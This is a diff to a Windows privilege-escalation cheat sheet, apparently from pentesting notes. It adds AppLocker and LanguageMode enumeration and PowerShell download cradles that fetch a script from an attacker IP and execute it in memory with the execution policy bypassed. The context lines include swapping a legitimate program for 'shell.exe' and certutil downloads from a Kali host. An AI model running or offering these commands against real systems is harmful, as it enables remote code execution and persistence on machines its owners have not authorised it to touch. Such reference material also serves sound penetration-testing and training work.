@@ -46,6 +46,14 @@ systeminfo
 [environment]::Is64BitOperatingSystem
 [environment]::Is64BitProcess
 
+# Check LanguageMode (FullLanguage is nicer to have)
+$ExecutionContext.SessionState.LanguageMode
+
+# Check AppLocker policy
+Get-AppLockerPolicy -Effective
+# View RuleCollections in detail
+Get-AppLockerPolicy -Effective | select -ExpandedProperty RuleCollections
+
 # all, addresses:port, PID
 netstat -ano
 ```
@@ -70,7 +78,11 @@ copy "C:\Program Files\..\legit.exe" C:\Temp
 copy /Y C:\Downloads\shell.exe "C:\Program Files\...\legit.exe"
 
 # Download to Windows
+# Load script in memory
 powershell.exe -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ip/file')"
+powershell.exe iex (iwr http://ip/file -usebasicparsing)
+
+# Save script on disk
 powershell.exe -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadFile('http://ip/file','C:\Users\Public\Downloads\file')"
 powershell.exe -nop -ep bypass -c "IWR -URI 'http://ip/file' -Outfile '/path/to/file'"
 certutil -urlcache -f http://kali_ip/file file
